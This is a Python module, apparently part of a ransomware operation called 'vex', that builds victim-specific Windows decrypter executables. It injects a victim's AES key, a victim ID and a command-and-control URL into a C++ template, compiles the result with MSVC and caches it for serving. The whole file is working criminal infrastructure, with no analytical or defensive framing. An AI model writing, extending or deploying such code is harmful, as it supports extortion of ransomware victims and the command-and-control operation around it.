"""Server-side decrypter compilation.

Locates MSVC (vcvars64.bat), injects the victim key into the template, compiles
once per key and caches the .exe. Build failures return None; callers fall back
to serving the .cpp.
"""

import base64
import hashlib
import os
import shutil
import subprocess
import tempfile
import threading

APP_DIR = os.path.dirname(os.path.abspath(__file__))
CACHE_DIR = os.environ.get("VEX_BUILD_CACHE", os.path.join(APP_DIR, "build_cache"))
_LOCK = threading.Lock()


def _cpp_literal(value) -> str:
    """Escape a value for safe embedding in a C++ string literal."""
    out = []
    for ch in str(value or ""):
        if ch in "\r\n\x00":
            continue
        if ch in "\\\"":
            out.append("\\" + ch)
        elif ord(ch) < 0x20:
            out.append("?")
        else:
            out.append(ch)
    return "".join(out)

_VS32_CANDIDATES = [
    r"D:\VisualStudio2022\VC\Auxiliary\Build\vcvars32.bat",
    r"C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars32.bat",
    r"C:\Program Files\Microsoft Visual Studio\2022\Professional\VC\Auxiliary\Build\vcvars32.bat",
    r"C:\Program Files\Microsoft Visual Studio\2022\Enterprise\VC\Auxiliary\Build\vcvars32.bat",
]

_VS_CANDIDATES = [
    r"D:\VisualStudio2022\VC\Auxiliary\Build\vcvars64.bat",
    r"C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat",
    r"C:\Program Files\Microsoft Visual Studio\2022\Professional\VC\Auxiliary\Build\vcvars64.bat",
    r"C:\Program Files\Microsoft Visual Studio\2022\Enterprise\VC\Auxiliary\Build\vcvars64.bat",
    r"C:\Program Files\Microsoft Visual Studio\18\Insiders\VC\Auxiliary\Build\vcvars64.bat",
]


def find_vcvars(arch: str = "x64"):
    if arch == "x86":
        env = os.environ.get("VEX_VCVARS32")
        if env and os.path.exists(env):
            return env
        for p in _VS32_CANDIDATES:
            if os.path.exists(p):
                return p
        return None
    env = os.environ.get("VEX_VCVARS")
    if env and os.path.exists(env):
        return env
    for p in _VS_CANDIDATES:
        if os.path.exists(p):
            return p
    return None


def available(arch: str = "x64") -> bool:
    return find_vcvars(arch) is not None


def cache_path(key_b64: str, vid: str = "", c2_url: str = "",
               arch: str = "x64") -> str:
    raw = f"{key_b64}|{vid}|{c2_url}|{arch}".encode()
    digest = hashlib.sha256(raw).hexdigest()[:32]
    return os.path.join(CACHE_DIR, f"vex_decrypter_{arch}_{digest}.exe")


def build(template_path: str, key_b64: str, vid: str = "", c2_url: str = "",
          arch: str = "x64"):
    """Return the compiled exe path, or None."""
    if not key_b64:
        return None
    try:
        raw_key = base64.b64decode(key_b64, validate=True)
    except Exception:
        return None
    if len(raw_key) != 32 or len(key_b64) > 64:
        return None

    out = cache_path(key_b64, vid, c2_url, arch)
    if os.path.exists(out) and os.path.getsize(out) > 64 * 1024:
        return out

    vcvars = find_vcvars(arch)
    if not vcvars:
        return None

    with _LOCK:
        if os.path.exists(out) and os.path.getsize(out) > 64 * 1024:
            return out

        try:
            with open(template_path, "r", encoding="utf-8") as f:
                src = (f.read()
                       .replace("{{AES_KEY_B64}}", key_b64)
                       .replace("{{VID}}", _cpp_literal(vid))
                       .replace("{{C2_URL}}", _cpp_literal(c2_url)))
        except OSError:
            return None

        tmp = tempfile.mkdtemp(prefix="vex_build_")
        try:
            cpp = os.path.join(tmp, "decrypter.cpp")
            with open(cpp, "w", encoding="utf-8") as f:
                f.write(src)

            cmd = (f'cmd /c ""{vcvars}" >nul && cd /d "{tmp}" && '
                   f'cl /nologo /std:c++20 /EHsc /MT /O2 "{cpp}" '
                   f'/Fe:out.exe /link bcrypt.lib shell32.lib user32.lib advapi32.lib '
                   f'winhttp.lib comctl32.lib comdlg32.lib"')
            subprocess.run(cmd, shell=True, timeout=300,
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

            built = os.path.join(tmp, "out.exe")
            if not os.path.exists(built) or os.path.getsize(built) < 64 * 1024:
                return None

            os.makedirs(CACHE_DIR, exist_ok=True)
            shutil.move(built, out)
            return out
        except Exception:
            return None
        finally:
            shutil.rmtree(tmp, ignore_errors=True)
